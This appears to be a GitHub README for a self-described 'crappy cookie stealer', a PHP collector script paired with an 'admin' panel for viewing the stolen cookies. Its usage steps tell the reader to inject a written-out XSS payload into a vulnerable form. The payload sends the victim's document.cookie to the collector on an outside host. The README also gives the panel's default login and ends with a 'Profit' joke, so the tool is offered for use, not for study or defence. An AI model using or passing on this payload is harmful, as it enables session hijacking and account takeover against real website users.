![Cookie](https://user-images.githubusercontent.com/8536299/99194653-0f8b8b80-2781-11eb-9415-d4a6efc5920e.png)

# Cookie-stealer
Crappy cookie stealer with 'admin' panel made long time ago..

```admin.php``` to view your cookies, ```c.php``` to grab the cookies.
c.php will write the cookies into admin.php, be sure to have write access on your server.

### Usage
1. Drop ```admin.php``` and ```c.php``` in the same directory.
2. Go to your vulnerable formulary and send him a payload to your ```c.php?c=``` something like this:
 * `<script>document.write("<img src='http://xxxxx.fr/c.php?c="+document.cookie+"'></img>");</script>`
3. Navigate to admin.php, login with username: **root** password: **toor**
4. ???
5. Profit.
